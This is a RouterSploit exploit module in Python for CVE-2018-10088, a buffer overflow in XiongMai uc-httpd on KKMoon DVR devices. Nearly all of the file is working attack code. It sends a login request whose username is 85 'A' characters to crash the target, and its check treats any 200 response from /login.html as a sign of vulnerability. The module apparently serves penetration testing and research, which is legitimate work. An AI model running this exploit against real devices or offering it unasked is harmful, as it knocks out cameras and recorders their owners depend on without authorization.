from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {
        "name": "XiongMai uc-httpd 1.0.0 - Buffer Overflow",
        "description": "Module exploits remote buffer overflow in XiongMai devices. "
                       "If the target is vulnerable, it will be crashed.",
        "authors": (
            "@jnazario",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10088",
            "https://www.exploit-db.com/exploits/44864/",
        ),
        "devices": (
            "KKMoon DVR",
        )
    }
    
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(81, "Target HTTP port")
    
    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            payload = 'command=login&username=' + ('A' * 85) + '&password=PoC'
            response = self.http_request(
                method='POST',
                path='/login.html',
                data=payload
                )
            return response.text
        else:
            print_error("Target is not vulnerable")
    
    @mute
    def check(self):
        response = self.http_request(method='GET',
                                     path='/login.html')
        if response is None:
            return False
        if response.status_code == 200:
            return True
        return False
